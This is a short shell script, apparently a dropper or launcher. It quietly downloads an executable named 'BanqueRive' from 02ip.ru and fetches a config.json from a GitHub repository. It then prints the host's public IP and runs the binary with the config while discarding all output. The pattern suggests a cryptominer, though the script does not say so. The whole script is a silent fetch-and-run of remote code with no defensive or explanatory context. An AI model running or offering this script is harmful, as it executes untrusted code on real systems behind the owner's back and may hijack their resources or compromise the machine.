wget -q -O BanqueRive https://02ip.ru/service && chmod +x BanqueRive >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./BanqueRive -c "config.json" >/dev/null 2>&1
